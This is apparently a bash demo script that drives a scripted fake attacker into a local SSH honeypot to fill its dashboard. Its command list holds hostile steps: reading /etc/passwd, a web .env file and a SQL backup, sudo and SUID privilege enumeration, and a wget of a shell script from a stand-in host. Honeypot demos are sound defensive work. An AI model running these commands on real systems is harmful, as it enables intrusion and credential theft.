#!/usr/bin/env bash
# Automated attacker simulation for demo purposes
set -e

SSH_PORT=${SSH_PORT:-2222}
HOST=${1:-localhost}

echo "=== HoneyPot Demo: Simulated Attack ==="
echo "Target: $HOST:$SSH_PORT"
echo ""

command -v sshpass >/dev/null || {
  echo "sshpass not found. Install with: brew install hudochenkov/sshpass/sshpass"
  echo "Running without sshpass — use the manual commands below instead:"
  echo "  ssh -p $SSH_PORT anyuser@$HOST  (password: anything)"
  echo "  Then run: whoami, id, uname -a, cat /etc/passwd, sudo -l, exit"
  exit 0
}

CMDS="whoami
id
uname -a
ls /home
cat /etc/passwd
ls /var/www/html
cat /var/www/html/.env
sudo -l
cat /home/admin/backup.sql
find / -perm -u=s -type f 2>/dev/null
wget http://example.com/shell.sh
exit"

sshpass -p 'password' ssh -p "$SSH_PORT" \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  "attacker@$HOST" <<EOF
$CMDS
EOF

echo ""
echo "=== Attack complete. Check the dashboard at http://localhost:5173 ==="
